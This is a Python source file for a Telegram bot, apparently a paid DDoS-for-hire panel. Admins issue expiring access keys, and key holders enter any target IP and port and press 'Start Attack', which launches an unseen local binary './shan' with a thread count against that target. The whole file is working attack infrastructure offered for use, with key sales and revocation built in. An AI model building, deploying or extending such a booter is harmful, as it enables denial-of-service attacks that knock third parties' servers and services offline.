#by @shantanu_24
import subprocess
import logging
import random
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from shann import TOKEN, ADMIN_ID  # Import the TOKEN and ADMIN_ID variables

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
#by @shantanu_24
# Path to your binary
BINARY_PATH = "./shan"
#by @shantanu_24
# Global variables
process = None
target_ip = None
target_port = None
thread = "10"
#by @shantanu_24
# In-memory storage for keys and user mappings
keys_db = {}
user_keys = {}
#by @shantanu_24
# Load keys and user data from JSON file
def load_data():
    global keys_db, user_keys
    try:
        with open("keys.json", "r") as f:
            data = json.load(f)
            keys_db = data.get("keys_db", {})
            user_keys = data.get("user_keys", {})
    except FileNotFoundError:
        keys_db = {}
        user_keys = {}

# Save keys and user data to JSON file
def save_data():
    with open("keys.json", "w") as f:
        json.dump({"keys_db": keys_db, "user_keys": user_keys}, f)
#by @shantanu_24
# Initialize data on startup
load_data()
#by @shantanu_24
# Function to check if a user is an admin
def is_admin(user_id):
    return user_id == ADMIN_ID
#by @shantanu_24
# Check if user has a valid key
def has_valid_key(user_id):
    if user_id in user_keys:
        user_key = user_keys[user_id]['key']
        expiry_date = datetime.strptime(user_keys[user_id]['expiry'], "%Y-%m-%d %H:%M:%S")

        # Check if the key is still valid and not expired
        if user_key in keys_db and expiry_date > datetime.now():
            return True

    # If the key is blocked or expired, remove it from user_keys
    if user_id in user_keys:
        del user_keys[user_id]
        save_data()
    return False
#by @shantanu_24
# Generate random 5-digit key
def generate_key():
    return str(random.randint(10000, 99999))

# Start command: Show Attack button
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not has_valid_key(update.message.from_user.id):
        await update.message.reply_text("You need to redeem a valid key to use this bot.\nUse /redeem <key> to activate.")
        return
#by @shantanu_24
    keyboard = [[InlineKeyboardButton("🚀 Attack 🚀", callback_data='attack')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🚀 Press the Attack button to start the attack. 🚀", reply_markup=reply_markup)

# Handle button clicks for "attack"
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'attack':
        await query.message.reply_text("Please enter the target and port in the format: <target> <port> 🚀")

# Handle input for target and port
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not has_valid_key(update.message.from_user.id):
        await update.message.reply_text("You need to redeem a valid key to use this bot.\nUse /redeem <key> to activate.")
        return

    global target_ip, target_port
    user_input = update.message.text.split()

    try:
        if len(user_input) == 1:
            target_ip = user_input[0]
            target_port = 80  # Default port
        elif len(user_input) == 2:
            target_ip, target_port = user_input[0], int(user_input[1])
        else:
            await update.message.reply_text("Invalid format. Use: <target> <port> or just <target> for default port 80.")
            return

        await update.message.reply_text(f"Target set to {target_ip}:{target_port} 🚀")

        # Display Start, Stop, and Reset buttons
        keyboard = [
            [InlineKeyboardButton("Start Attack 🚀", callback_data='start_attack')],
            [InlineKeyboardButton("Stop Attack ❌", callback_data='stop_attack')],
            [InlineKeyboardButton("Reset Attack ⚙️", callback_data='reset_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Choose an action:", reply_markup=reply_markup)

    except ValueError:
        await update.message.reply_text("Invalid port number. Please enter a valid number.")

# Start the attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port

    if not target_ip or not target_port:
        await update.callback_query.message.reply_text("Please configure the target and port.")
        return
#by @shantanu_24
    if process and process.poll() is None:
        await update.callback_query.message.reply_text("Attack is already running.")
        return
#by @shantanu_24
    try:
        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), thread], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await update.callback_query.message.reply_text(f"🚀 Attack started on {target_ip}:{target_port}")
    except Exception as e:
        await update.callback_query.message.reply_text(f"Error starting attack: {e}")
        logging.error(f"Error starting attack: {e}")
#by @shantanu_24
# Stop the attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process
    if not process or process.poll() is not None:
        await update.callback_query.message.reply_text("No attack is currently running.")
        return
#by @shantanu_24
    process.terminate()
    process.wait()
    await update.callback_query.message.reply_text("🚀 Attack stopped.")
#by @shantanu_24
# Reset the attack
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port
    if process and process.poll() is None:
        process.terminate()
        process.wait()
#by @shantanu_24
    target_ip = None
    target_port = None
    await update.callback_query.message.reply_text("Attack has been reset.")
#by @shantanu_24
# Button callback handler
async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
#by @shantanu_24
    if query.data == 'start_attack':
        await start_attack(update, context)
    elif query.data == 'stop_attack':
        await stop_attack(update, context)
    elif query.data == 'reset_attack':
        await reset_attack(update, context)

# /key command (Admin only)
async def generate_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("You are not authorized to use this command.")
        return
#by @shantanu_24
    try:
        num_days = int(context.args[0])
        key = generate_key()
        expiry_date = (datetime.now() + timedelta(days=num_days)).strftime("%Y-%m-%d %H:%M:%S")
        keys_db[key] = {"expiry": expiry_date}
        save_data()
        await update.message.reply_text(f"Generated Key: {key}\nValid for {num_days} days.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /key <no. of days>")

# /redeem command
async def redeem_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    try:
        key = context.args[0]
        if key in keys_db and key not in [data['key'] for data in user_keys.values()]:
            expiry_date = keys_db[key]['expiry']
            user_keys[user_id] = {"expiry": expiry_date, "key": key}
            save_data()
            await update.message.reply_text("Key redeemed successfully! You can now use the bot.")
        else:
            await update.message.reply_text("Invalid or already redeemed key.")
    except IndexError:
        await update.message.reply_text("Usage: /redeem <key>")

# /block command (Admin only)
async def block_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("You are not authorized to use this command.")
        return
#by @shantanu_24
    try:
        key = context.args[0]
        if key in keys_db:
            del keys_db[key]

            # Remove the key from all users who have redeemed it
            users_to_remove = [user_id for user_id, data in user_keys.items() if data['key'] == key]
            for user_id in users_to_remove:
                del user_keys[user_id]

            save_data()
            await update.message.reply_text(f"Key {key} has been blocked and revoked from users.")
        else:
            await update.message.reply_text("Key not found.")
    except IndexError:
        await update.message.reply_text("Usage: /block <key>")
#by @shantanu_24
# Main function to start the bot
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("key", generate_key_command))
    application.add_handler(CommandHandler("redeem", redeem_key_command))
    application.add_handler(CommandHandler("block", block_key_command))
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^attack$'))
    application.add_handler(CallbackQueryHandler(button_callback_handler, pattern='^(start_attack|stop_attack|reset_attack)$'))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    application.run_polling()

if __name__ == "__main__":
    main()
    #by @shantanu_24
    #by @shantanu_24
    #by @shantanu_24
    #by @shantanu_24